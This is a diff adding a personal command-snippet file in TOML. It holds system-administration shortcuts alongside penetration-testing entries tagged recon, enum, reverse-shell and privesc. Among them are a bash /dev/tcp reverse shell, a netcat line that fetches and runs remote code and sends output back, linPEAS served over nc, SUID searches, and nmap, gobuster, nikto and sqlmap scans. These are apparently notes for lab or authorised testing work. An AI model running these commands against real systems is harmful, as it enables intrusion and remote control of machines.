@@ -1,0 +1,264 @@
+
+[[Snippets]]
+  Description = "add padding to avoid invalid input for base64"
+  Output = ""
+  Tag = ["decode"]
+  command = " | fold -w 4 | sed '$ d' | tr -d '\\n'"
+
+[[Snippets]]
+  Description = "run http server in current directory"
+  Output = ""
+  Tag = ["enum"]
+  command = "python3 -m http.server <port=8888>"
+
+[[Snippets]]
+  Description = "upload linpeas with nc"
+  Output = ""
+  Tag = ["enum"]
+  command = "cat /usr/share/peass/linPEAS/linpeas.sh | nc -lvnp <port=8888> & nc -lvnp <port=9999> | tee linpeas_report_$(date +%Y%m%d%H%M%S).txt & wait"
+
+[[Snippets]]
+  Description = "execute from memory and send output back to the host"
+  Output = ""
+  Tag = ["enum"]
+  command = "nc <ip:> <port=8888> | sh 2>&1 | nc <ip:> <port=9999>"
+
+[[Snippets]]
+  Description = "file enumeration"
+  Output = ""
+  Tag = ["enum"]
+  command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 -x html,php,sh,js,css | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+
+[[Snippets]]
+  Description = "dir enumeration"
+  Output = ""
+  Tag = ["enum"]
+  command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+
+[[Snippets]]
+  Description = "vhost enumeration"
+  Output = ""
+  Tag = ["enum"]
+  command = "gobuster vhost -u <url:> -w /usr/share/wordlists/discovery/subdomains-top1million-5000.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+
+[[Snippets]]
+  Description = "find SUID Binaries"
+  Output = ""
+  Tag = ["enum"]
+  command = "find / -type f -perm -04000 -ls 2>/dev/null"
+
+[[Snippets]]
+  Description = "show passwd"
+  Output = ""
+  Tag = ["enum"]
+  command = "cat /etc/passwd"
+
+[[Snippets]]
+  Description = "show system info"
+  Output = ""
+  Tag = ["enum"]
+  command = "( set -x; uname -a; cat /etc/os-release )"
+
+[[Snippets]]
+  Description = "show crontab"
+  Output = ""
+  Tag = ["enum"]
+  command = "cat /etc/crontab"
+
+[[Snippets]]
+  Description = "list enabled capabilities"
+  Output = ""
+  Tag = ["enum"]
+  command = "getcap -r / 2>/dev/null"
+
+[[Snippets]]
+  Description = "show no_root_squash"
+  Output = ""
+  Tag = ["enum"]
+  command = "grep no_root_squash /etc/exports"
+
+[[Snippets]]
+  Description = "allow incoming traffic"
+  Output = ""
+  Tag = ["firewall"]
+  command = "( set -x; sudo ufw allow from <ip:> proto tcp to any port <port=8888,9999> && sudo ufw status verbose )"
+
+[[Snippets]]
+  Description = "delete incoming traffic rule"
+  Output = ""
+  Tag = ["firewall"]
+  command = "( set -x; sudo ufw delete allow from <ip:> proto tcp to any port <port=8888,9999> && sudo ufw status verbose )"
+
+[[Snippets]]
+  Description = "reset and restart ufw"
+  Output = ""
+  Tag = ["firewall"]
+  command = "( set -x; sudo ufw --force reset && sudo ufw enable && sudo ufw status verbose )"
+
+[[Snippets]]
+  Description = "fast port scan"
+  Output = ""
+  Tag = ["recon"]
+  command = "grc nmap -F -sV -Pn -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
+
+[[Snippets]]
+  Description = "full port scan"
+  Output = ""
+  Tag = ["recon"]
+  command = "grc nmap -sV -sC -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
+
+[[Snippets]]
+  Description = "scan vulnerabilities"
+  Output = ""
+  Tag = ["recon"]
+  command = "nikto -port <port:> -h <ip:> | tee nikto_report_$(date +%Y%m%d%H%M%S).txt"
+
+[[Snippets]]
+  Description = "netcat reverse shell remote"
+  Output = ""
+  Tag = ["reverse-shell", "payload"]
+  command = "bash -i >&/dev/tcp/<ip:>/<port=8888> 0>&1"
+
+[[Snippets]]
+  Description = "netcat reverse shell local"
+  Output = ""
+  Tag = ["reverse-shell"]
+  command = "tmux send-keys 'bash -l' Enter 'nc -lvnp <port=8888>' Enter"
+
+[[Snippets]]
+  Description = "stabilize shell using script command"
+  Output = ""
+  Tag = ["reverse-shell"]
+  command = "/usr/bin/script -qc /bin/bash /dev/null"
+
+[[Snippets]]
+  Description = "stabilize shell using stty and $TERM"
+  Output = ""
+  Tag = ["reverse-shell"]
+  command = "tmux send-keys 'stty raw -echo; fg' Enter 'export TERM=xterm' Enter"
+
+[[Snippets]]
+  Description = "list the privileges for the invoking user"
+  Output = ""
+  Tag = ["privesc"]
+  command = "sudo -l"
+
+[[Snippets]]
+  Description = "show ssl certificate"
+  Output = ""
+  Tag = ["ops"]
+  command = "sudo grc nmap -p 443 --script ssl-cert <domain=>"
+
+[[Snippets]]
+  Description = "show all resources"
+  Output = ""
+  Tag = ["container"]
+  command = "kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 -t kubectl get --show-kind --ignore-not-found"
+
+[[Snippets]]
+  Description = "edit hosts file"
+  Output = ""
+  Tag = ["misc"]
+  command = "[ -z \"$EDITOR\" ] && export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi); [ $(id -u) = 0 ] && $EDITOR /etc/hosts || sudoedit /etc/hosts"
+
+[[Snippets]]
+  Description = "generate random string"
+  Output = ""
+  Tag = ["misc"]
+  command = "tr -dc A-Za-z0-9 </dev/urandom | head -c 20; echo ''"
+
+[[Snippets]]
+  Description = "set $EDITOR"
+  Output = ""
+  Tag = ["misc"]
+  command = "export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi)"
+
+[[Snippets]]
+  Description = "run vim with some options"
+  Output = ""
+  Tag = ["misc"]
+  command = "vim -p -c 'set ignorecase smartcase wildignorecase tabstop=2 softtabstop=2 shiftwidth=2 expandtab paste' "
+
+[[Snippets]]
+  Description = "regenerate and sign initramfs"
+  Output = ""
+  Tag = ["misc"]
+  command = "sudo mkinitcpio -P"
+
+[[Snippets]]
+  Description = "reboot into the firmware setup interface"
+  Output = ""
+  Tag = ["misc"]
+  command = "systemctl reboot --firmware-setup"
+
+[[Snippets]]
+  Description = "show system startup time"
+  Output = ""
+  Tag = ["misc"]
+  command = "(set -x; systemd-analyze; systemd-analyze critical-chain)"
+
+[[Snippets]]
+  Description = "show nvim startup time"
+  Output = ""
+  Tag = ["misc"]
+  command = "vim-startuptime -vimpath nvim"
+
+[[Snippets]]
+  Description = "switch yubikeys for same GPG key"
+  Output = ""
+  Tag = ["misc"]
+  command = "gpg-connect-agent \"scd serialno\" \"learn --force\" /bye"
+
+[[Snippets]]
+  Description = "show CPU frequency"
+  Output = ""
+  Tag = ["misc"]
+  command = "sudo cpupower frequency-info"
+
+[[Snippets]]
+  Description = "change maximum CPU frequency"
+  Output = ""
+  Tag = ["misc"]
+  command = "sudo cpupower frequency-set -u <freq=5GHz>"
+
+[[Snippets]]
+  Description = "clone and change directory"
+  Output = ""
+  Tag = ["misc"]
+  command = "read 'url?url: '; ghq get \"$url\"; cd $(ghq list -p \"$_\")"
+
+[[Snippets]]
+  Description = "Get log of hyprland session"
+  Output = ""
+  Tag = ["misc"]
+  command = "cat $XDG_RUNTIME_DIR/hypr/$(command ls -t $XDG_RUNTIME_DIR/hypr/ | head -n 1)/hyprland.log"
+
+[[Snippets]]
+  Description = "show most used commands"
+  Output = ""
+  Tag = ["misc"]
+  command = "history 1 | awk '{print $2}' | sort | uniq -c | sort -rn | head -n 20"
+
+[[Snippets]]
+  Description = "list unrequired dependencies"
+  Output = ""
+  Tag = ["misc"]
+  command = "pacman -Qtd"
+
+[[Snippets]]
+  Description = "generate random password"
+  Output = ""
+  Tag = ["misc"]
+  command = "pwgen -c -n -y -B -1 20 1"
+
+[[Snippets]]
+  Description = "Test sql injection"
+  Output = ""
+  Tag = []
+  command = "sqlmap -u '<url>' --dbs --batch --level=2 --technique=BEUSQ"
+
+[[Snippets]]
+  Description = "Scan website with zap"
+  Output = ""
+  Tag = []
+  command = "docker run -t zaproxy/zap-stable zap-baseline.py -t <url>"
